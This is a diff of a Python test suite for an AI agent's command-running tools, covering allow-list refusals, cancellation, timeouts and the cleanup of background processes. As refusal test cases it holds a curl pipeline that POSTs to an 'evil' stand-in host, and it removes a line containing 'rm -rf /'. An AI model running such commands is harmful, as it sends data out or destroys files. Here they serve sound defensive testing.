@@ -1077,8 +1077,10 @@ def test_a_failing_command_is_not_a_refusal(project):
     assert result.detail["kind"] == "command"   # it ran
     assert result.detail["exit_code"] == 2
 
-    refused = _tools(project, "tester").run_command("rm -rf /")
-    assert refused.ok is False and refused.detail == {}   # it did not
+    refused = _tools(project, "tester").run_command("curl http://x")
+    assert refused.ok is False
+    assert refused.detail["kind"] == "refused_program"    # it did not run
+    assert refused.detail["programs"] == ["curl"]
 
 
 # ------------------------------------------------- command policy
@@ -1099,7 +1101,9 @@ def test_every_program_in_a_pipeline_is_checked(project):
 def test_a_pipeline_is_refused_if_any_program_is_not_allowed(project):
     tools = _tools(project, "tester")
     result = tools.run_command("pytest -q | curl -X POST http://evil")
-    assert not result.ok and result.detail == {}
+    assert not result.ok
+    assert result.detail["kind"] == "refused_program"     # nothing executed
+    assert result.detail["programs"] == ["curl"]
     assert "'curl'" in result.text
 
 
@@ -1138,3 +1142,122 @@ def test_the_policy_persists(tmp_path):
     assert reopened.policy.allowed == ["node", "pytest"]
     assert reopened.policy.shell is False
     assert len(reopened.reset().allowed) > 10        # back to the defaults
+
+
+# ------------------------------------------- long commands and cancelling
+
+def test_a_command_announces_itself_before_it_runs(project):
+    """A command that blocks for the full timeout used to show nothing at all
+    until it was killed."""
+    events = []
+    tools = AgentTools(project, BUILTIN_ROLES["tester"],
+                       notify=lambda kind, payload: events.append((kind, payload)))
+    tools.run_command("echo hi")
+
+    kinds = [k for k, _ in events]
+    assert kinds == ["command_started", "command_finished"]
+    started = events[0][1]
+    assert started["command"] == "echo hi" and started["command_id"]
+    assert events[1][1]["command_id"] == started["command_id"]
+    assert events[1][1]["exit_code"] == 0
+
+
+def test_a_running_command_can_be_cancelled(project):
+    import threading
+    import time
+
+    from trance.agents.tools import cancel_command, running_commands
+
+    ids = []
+    tools = AgentTools(project, BUILTIN_ROLES["tester"],
+                       notify=lambda kind, p: ids.append(p["command_id"])
+                       if kind == "command_started" else None)
+
+    result = {}
+
+    def run():
+        result["outcome"] = tools.run_command("python3 -c 'import time; time.sleep(30)'")
+
+    worker = threading.Thread(target=run, daemon=True)
+    worker.start()
+    for _ in range(50):                     # wait for it to register
+        if ids and running_commands():
+            break
+        time.sleep(0.1)
+
+    assert cancel_command(ids[0]) is True
+    worker.join(timeout=15)
+    outcome = result["outcome"]
+    assert outcome.ok is False
+    assert outcome.detail["cancelled"] is True
+    assert "Cancelled by the user" in outcome.text
+    assert not running_commands()           # deregistered either way
+
+
+def test_cancelling_an_unknown_command_is_harmless():
+    from trance.agents.tools import cancel_command
+
+    assert cancel_command("cmd_nope") is False
+
+
+def test_a_timeout_explains_backgrounded_processes(project, monkeypatch):
+    """`node server.js &` blocks until the timeout, which is what happened."""
+    from trance.agents import tools as tools_module
+
+    monkeypatch.setattr(tools_module, "COMMAND_TIMEOUT_S", 1)
+    result = AgentTools(project, BUILTIN_ROLES["tester"]).run_command(
+        "python3 -c 'import time; time.sleep(30)'")
+    assert result.ok is False
+    assert result.detail["timed_out"] is True
+    assert "ending in `&`" in result.text          # names the real cause
+
+
+def test_a_refusal_names_the_programs_for_the_ui(project):
+    result = _tools(project, "tester").run_command("curl -s http://x | jq .")
+    assert result.detail["kind"] == "refused_program"
+    assert result.detail["programs"] == ["curl", "jq"]
+    assert result.detail["agent"] == "tester"
+    assert result.detail["agent_has_own_list"] is False   # so the global list applies
+
+
+def test_a_backgrounded_process_does_not_block_the_kill(project, monkeypatch):
+    """`node server.js &` left a grandchild holding the stdout pipe, so reading
+    the remaining output after the kill blocked forever."""
+    import time
+
+    from trance.agents import tools as tools_module
+
+    monkeypatch.setattr(tools_module, "COMMAND_TIMEOUT_S", 2)
+    started = time.time()
+    result = AgentTools(project, BUILTIN_ROLES["tester"]).run_command(
+        "python3 -m http.server 0 --bind 127.0.0.1 &")
+    assert result.detail["timed_out"] is True
+    assert time.time() - started < 20        # it returns, rather than hanging
+    assert "ending in `&`" in result.text
+
+
+def test_cancel_kills_grandchildren_too(project):
+    import threading
+    import time
+
+    from trance.agents.tools import cancel_command, running_commands
+
+    ids = []
+    tools = AgentTools(project, BUILTIN_ROLES["tester"],
+                       notify=lambda k, p: ids.append(p["command_id"])
+                       if k == "command_started" else None)
+    out = {}
+    worker = threading.Thread(
+        target=lambda: out.update(r=tools.run_command(
+            "python3 -c 'import subprocess,time; "
+            "subprocess.Popen([\"sleep\",\"60\"]); time.sleep(60)'")),
+        daemon=True)
+    worker.start()
+    for _ in range(60):
+        if ids and running_commands():
+            break
+        time.sleep(0.1)
+
+    assert cancel_command(ids[0]) is True
+    worker.join(timeout=20)
+    assert "r" in out and out["r"].detail["cancelled"] is True
